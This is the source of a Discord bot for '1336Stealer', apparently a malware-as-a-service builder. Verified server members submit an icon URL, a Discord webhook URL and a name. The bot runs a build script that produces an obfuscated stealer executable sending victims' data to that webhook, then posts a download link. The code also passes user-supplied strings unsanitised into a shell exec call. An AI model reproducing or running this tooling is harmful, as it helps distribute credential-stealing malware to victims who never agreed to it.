const { REST, Routes, SlashCommandBuilder } = require('discord.js');
const { Client, GatewayIntentBits } = require('discord.js');
const client = new Client({ intents: [GatewayIntentBits.Guilds] });

const ICO = require('icojs');
const https = require('https');
const fs = require('fs');
const util = require('util');
const exec = util.promisify(require('child_process').exec);
const { EmbedBuilder } = require('discord.js');
var queue = [];

const token = "your token";
const clientId = "1122103831178772510";
const guildId = "1123981101602459811";
const verifiedRole = "1123981102021869619";

function generateId(len) {
    var text = "";
    var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (var i = 0; i < len; i++)
        text += possible.charAt(Math.floor(Math.random() * possible.length));
    return text;
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

const refresh = new EmbedBuilder()
    .setColor(0x000000)
    .setTitle('1336Stealer')
    .setURL('https://t.me/St34ler')
    .setDescription('Successfully refresh the cache!')
    .setTimestamp()
    .setFooter({ text: '@1336Stealer', iconURL: 'https://cdn.discordapp.com/attachments/1056927381333475369/1057369902555598938/1336.gif' });

const buildstarted = new EmbedBuilder()
    .setColor(0x000000)
    .setTitle('1336Stealer')
    .setURL('https://t.me/St34ler')
    .setDescription('Started ur build... ETA: 1m')
    .setTimestamp()
    .setFooter({ text: '@1336Stealer', iconURL: 'https://cdn.discordapp.com/attachments/1056927381333475369/1057369902555598938/1336.gif' });

const invalidicodetected = new EmbedBuilder()
    .setColor(0x000000)
    .setTitle('1336Stealer')
    .setURL('https://t.me/St34ler')
    .addFields({ name: 'ERROR: Invalid .ico detected, build process aborted.', value: '*Please retry with .ico file*', inline: true })
    .setTimestamp()
    .setFooter({ text: '@1336Stealer', iconURL: 'https://cdn.discordapp.com/attachments/1056927381333475369/1057369902555598938/1336.gif' });

const invalidicodetected2 = new EmbedBuilder()
    .setColor(0x000000)
    .setTitle('1336Stealer')
    .setURL('https://t.me/St34ler')
    .addFields({ name: 'ERROR: Invalid .ico detected, build process aborted.', value: '*Please retry with 64x64 ico file, if not work, contact an admin.*', inline: true })
    .setTimestamp()
    .setFooter({ text: '@1336Stealer', iconURL: 'https://cdn.discordapp.com/attachments/1056927381333475369/1057369902555598938/1336.gif' });

const noverifiedrole = new EmbedBuilder()
    .setColor(0x000000)
    .setTitle('1336Stealer')
    .setURL('https://t.me/St34ler')
    .addFields({ name: 'ERROR: You don\'t have verified role, build process aborted.', value: '*if it\'s a bug do /refresh in 1336Stealer server.*', inline: true })
    .setTimestamp()
    .setFooter({ text: '@1336Stealer', iconURL: 'https://cdn.discordapp.com/attachments/1056927381333475369/1057369902555598938/1336.gif' });

const commands = [
    new SlashCommandBuilder().setName('build').setDescription('fuck Blaze Shit')
        .addStringOption(option =>
            option.setName('icon_url')
                .setDescription('icon url (type none for node classic icon)')
                .setRequired(true))
        .addStringOption(option =>
            option.setName('webhook_url')
                .setDescription('webhook')
                .setRequired(true))
        .addStringOption(option =>
            option.setName('name')
                .setDescription('name')
                .setRequired(true)),
    new SlashCommandBuilder().setName("refresh").setDescription("refresh cache of build bot")
].map(command => command.toJSON());

const rest = new REST({ version: '10' }).setToken(token);
(async () => {
    try {
        await rest.put(Routes.applicationCommands(clientId), { body: commands });
    } catch (error) {
        console.error(error);
    }
})();

client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
});

fs.appendFileSync("/home/vshell/Stealer/ClientObf/link.txt", "");

var expression = /https?:\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&//=]*)/gi;
var urlMatch = new RegExp(expression);

async function queueLoop() {
    while(true) {
        await sleep(5000);
        if (queue.length == 0) {
            continue
        }
        const element = queue.shift();
        console.log(element);

        element.interaction.editReply({embeds: [buildstarted]})

        if (element.icon_error) {
            await exec(`node build.js node.ico ${element.webhook_url} ${element.name}`, {
                cwd: process.cwd() + "/../ClientObf/"
            })
            const gofileurl = fs.readFileSync('/home/vshell/Stealer/ClientObf/link.txt');
            const downloadlink1 = new EmbedBuilder()
                .setColor(0x000000)
                .setTitle('1336Stealer')
                .setURL('https://t.me/St34ler')
                .setDescription('Download link: [Download](' + gofileurl + ')')
                .setTimestamp()
                .setFooter({ text: '@1336Stealer', iconURL: 'https://cdn.discordapp.com/attachments/1056927381333475369/1057369902555598938/1336.gif' });
            element.interaction.editReply({embeds: [downloadlink1]});
            fs.rmSync(`/home/vshell/Stealer/ClientObf/link.txt`)
        } else {

            const data = fs.readFileSync(`${process.cwd()}/../ClientObf/${element.build_id}.ico`)
            try {
                if (!ICO.isICO(data)) {
                    element.interaction.editReply({embeds: [invalidicodetected], ephemeral: true })
                    continue
                }
            } catch (error) {
                element.interaction.editReply({embeds: [invalidicodetected], ephemeral: true })
                fs.rmSync(`${process.cwd()}/../ClientObf/${element.build_id}.ico`)
                continue
            }
            try {
		console.log(`node build.js ${element.build_id}.ico ${element.webhook_url} ${element.name}`)
            await exec(`node build.js ${element.build_id}.ico ${element.webhook_url} ${element.name}`, {
                cwd: process.cwd() + "/../ClientObf/"
            })
            const gofileurl = fs.readFileSync('/home/vshell/Stealer/ClientObf/link.txt');
            const downloadlink2 = new EmbedBuilder()
            .setColor(0x000000)
            .setTitle('1336Stealer')
            .setURL('https://t.me/St34ler')
            .setDescription('Download link: [Download](' + gofileurl + ')')
            .setTimestamp()
            .setFooter({ text: '@1336Stealer', iconURL: 'https://cdn.discordapp.com/attachments/1056927381333475369/1057369902555598938/1336.gif' });
            element.interaction.editReply({embeds: [downloadlink2]});
        } catch (e) {console.log(e), element.interaction.editReply({embeds: [invalidicodetected2]})}
        fs.rmSync(`${process.cwd()}/../ClientObf/${element.build_id}.ico`)
        fs.rmSync(`/home/vshell/Stealer/ClientObf/link.txt`)
        }
    }
}

queueLoop()

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand() || !interaction.guild) return;

    let guild = client.guilds.cache.get(guildId);
    let role = guild.roles.cache.get(verifiedRole);
    let verified = role.members.map(m => m.id);

    if (interaction.commandName === 'build') {

        if (!verified.includes(interaction.user.id)) {
            await interaction.reply({embeds: [noverifiedrole]});
            return
        }

        const icon_url = interaction.options.getString('icon_url');
        const antivm = interaction.options.getBoolean('antivm');
        const webhook_url = interaction.options.getString('webhook_url');
        const name = interaction.options.getString('name');

        const build_id = generateId(8);

        const queue1 = new EmbedBuilder()
            .setColor(0x000000)
            .setTitle('1336Stealer')
            .setURL('https://t.me/St34ler')
            .addFields({ name: 'Sucessfully added ur build to queue', value:`*Queue size: ${queue.length}, ETA: ${queue.length*2}m*`, inline: true })
            .setTimestamp()
            .setFooter({ text: '@1336Stealer', iconURL: 'https://cdn.discordapp.com/attachments/1056927381333475369/1057369902555598938/1336.gif' });

        if (icon_url == "none") {
            interaction.reply({embeds: [queue1]});
            queue.push({
                id: build_id,
                icon_url: icon_url,
                webhook_url: webhook_url,
                antivm: antivm,
                name: name,
                icon_error: true,
                interaction: interaction
            })
            return
        }

        if (!icon_url.match(urlMatch)) {
            await interaction.reply('icon_url must be valid url');
            return
        }


        const queue2 = new EmbedBuilder()
            .setColor(0x000000)
            .setTitle('1336Stealer')
            .setURL('https://t.me/St34ler')
            .addFields({ name: 'Sucessfully added ur build to queue', value:`*Queue size: ${queue.length+1}, ETA: ${(queue.length+1)*2}m*`, inline: true })
            .setTimestamp()
            .setFooter({ text: '@1336Stealer', iconURL: 'https://cdn.discordapp.com/attachments/1056927381333475369/1057369902555598938/1336.gif' });
        interaction.reply({embeds: [queue2]});
        try {
            const file = fs.createWriteStream(process.cwd() + `/../ClientObf/${build_id}.ico`);
            const request = https.get(icon_url, function(response) {
                response.pipe(file);

                file.on("finish", () => {
                    file.close();
                    queue.push({
                        build_id: build_id,
                        icon_url: icon_url,
                        webhook_url: webhook_url,
                        antivm: antivm,
                        name: name,
                        icon_error: false,
                        interaction: interaction
                    })
                });
            });
        } catch (e) {
            queue.push({
                id: build_id,
                icon_url: icon_url,
                webhook_url: webhook_url,
                antivm: antivm,
                name: name,
                icon_error: true,
                interaction: interaction
            })
        }
    }
    

    if (interaction.commandName === 'refresh') {
        await interaction.reply({embeds: [refresh], ephemeral: true });
        return
    }
});

client.login(token);
